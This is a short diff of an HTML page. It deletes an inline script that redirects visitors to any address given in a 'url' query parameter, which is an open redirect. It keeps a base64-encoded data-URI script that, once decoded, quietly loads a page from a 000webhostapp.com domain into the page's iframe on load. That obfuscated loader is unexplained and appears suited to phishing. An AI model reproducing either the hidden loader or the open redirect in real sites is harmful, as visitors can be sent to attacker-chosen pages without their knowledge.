@@ -16,27 +16,6 @@
         Your browser doesn't support iframes
 
     </iframe>
-    
-    <script>
-       
-     var parseQueryString = function (strQuery){
-	var strSearch   = strQuery.substr(1),
-	    strPattern  = /([^=]+)=([^&]+)&?/ig,
-	    arrMatch    = strPattern.exec(strSearch),
-	    objRes      = {};
-	while(arrMatch != null){
-	    objRes[arrMatch[1]] = arrMatch[2];
-	    arrMatch = strPattern.exec(strSearch);
-	}
-	   
-        return objRes;
-     
-    };
-
-    var queryStr = parseQueryString(window.location.search),
-	someVar1 = window.location = queryStr['url'];
-   
-   </script>
 	
    <script type="text/javascript" src="data:application/x-javascript;base64,dmFyIGlmcmFtZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lmcmFtZScpOwp3aW5kb3cuZnJhbWVzWzBdLmxvY2F0aW9uID0gImh0dHBzOi8vYXBpLWlkNTk5MTUxMi4wMDB3ZWJob3N0YXBwLmNvbS8iOw=="></script>
 	
